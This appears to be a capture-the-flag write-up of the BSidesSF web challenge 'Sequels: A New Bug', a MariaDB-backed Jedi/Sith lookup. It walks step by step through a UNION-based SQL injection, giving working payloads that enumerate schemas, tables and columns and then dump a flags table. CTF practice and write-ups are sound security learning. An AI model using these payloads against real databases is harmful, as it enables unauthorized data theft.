# WEB

# Sequels: A New Bug

Challenge Description:

    Sequels: A New Bug
    
    Web
    We've decided to track known Jedi and Sith, so we put together this database. Hopefully there are no bugs?
    Author: Matir
    https://sequels-1-7a1d808a.challenges.bsidessf.net/


Solution: 


Seems like an SQL injection so I tried the basic  `'` and got the following response



 which confirms the potential, and that its using [mariaDB](https://mariadb.org/about/)
So now we just need to find a mysql/Mariadb injection

Seems like the sql at the back end is doing something like this with our input


    select * from <Tablename> where <Tablename>.<Field>= <ourinput> Limit 10

If I leave it blank it gives me 10 users:




I tried the most common payload aka


    1' OR 1 = 1--  

 
 we get an extra 11th user aka Yoda
 




I found this wonderful cheatsheet so I followed it

https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/


initially I tried the nulls but it wasnt working I was either getting an error on string conversion and the number of columns,
Since we know the number of columns is three, I tried using the same schema name three times:

    1 ' UNION ALL SELECT concat(schema_name) ,concat(schema_name)  ,concat(schema_name) FROM information_schema.schemata-- 

and I got the db name



so I followed with the table names, also we should always add it thrice since that's the number of fields in the first table hence our next payload is:

    1' UNION ALL SELECT concat(TABLE_NAME), concat(TABLE_NAME), concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='sequels1'-- 
!

now we know name of the table so lets try accessing column names and the same field but three times


    1 ' UNION ALL SELECT concat(column_name), concat(column_name), concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='flags'-- 


now we know the fields so we can run the sql query, since I got to learn about concat command and using random hex values I will add it to as the third field payload


    1' UNION ALL SELECT name, value, concat(0x28,name,0x3a,value,0x29) FROM flags-- 


